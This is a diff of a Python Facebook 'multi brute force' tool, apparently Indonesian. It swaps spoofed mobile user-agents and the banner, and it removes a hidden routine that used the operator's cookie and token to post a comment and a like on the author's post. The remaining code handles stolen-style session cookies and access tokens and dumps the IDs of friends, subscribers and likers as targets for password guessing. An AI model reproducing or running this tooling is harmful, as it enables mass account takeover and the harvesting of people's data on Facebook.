@@ -12,10 +12,10 @@ Dump = []
 def banner_logo():
     os.system('cls' if os.name == 'nt' else 'clear') # Coded by Rozhak
     Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
-[bold red]    .-.  .-..----. .----.    .----..----.  
-[bold red]    }  \/  {| {_} }} |__}___ } |__}| {_} } 
-[bold white]    | {  } || {_} }} '_}{___}} '_} | {_} } 
-[bold white]    `-'  `-'`----' `--'      `--'  `----'  
+[bold red]    .-.  .-. .----.  .----.    .----..----.  
+[bold red]    }  \/  { | {_} } } |__}___ } |__}| {_} } 
+[bold white]    | {  } ||{_} } }'_} {___}} '_} | {_} } 
+[bold white]  `-'  `-' `----'  `--'       `--' `----'  
 [bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
     return 0
 ### DAPATKAN NAMA ###
@@ -23,7 +23,7 @@ def dapatkan_nama(cookie, token_eaag):
     with requests.Session() as r:
         r.headers.update({
             'host': 'graph.facebook.com',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]',
             'cookie': cookie
         })
         response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
@@ -45,7 +45,7 @@ def login_cookie():
             with requests.Session() as r:
                 r.headers.update({
                     'cookie': cookie,
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]',
                     'host': 'business.facebook.com'
                 })
                 response3 = r.get('https://business.facebook.com/business_locations').text
@@ -64,21 +64,7 @@ def login_cookie():
             Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
     except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
-### BOT KOMEN ###
-def bot_komen(cookie, token_eaag):
-    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
-        text = random.choice(
-            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
-        )
-        r.cookies.update({
-            'cookie': cookie
-        })
-        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
-        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
-        if "\"id\":\"" in str(response) and str(response2) == 'true':
-            return 0
-        else:
-            return 1
+
 ### DAFTAR MENU ###
 def daftar_menu():
     try:
@@ -149,7 +135,7 @@ class dump:
                     'upgrade-insecure-requests': '1',
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                     'host': 'm.facebook.com',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]',
                     'accept-language': 'id,en;q=0.9',
                 })
                 r.cookies.update({
@@ -188,7 +174,7 @@ class dump:
             with requests.Session() as r:
                 r.headers.update({
                     'host': 'graph.facebook.com',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]',
                     'cookie': cookie
                 })
                 response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
@@ -216,7 +202,7 @@ class dump:
             with requests.Session() as r:
                 r.headers.update({
                     'host': 'graph.facebook.com',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1;SM-G532M Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/223.0.0.11.121;]',
                     'cookie': cookie
                 })
                 response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
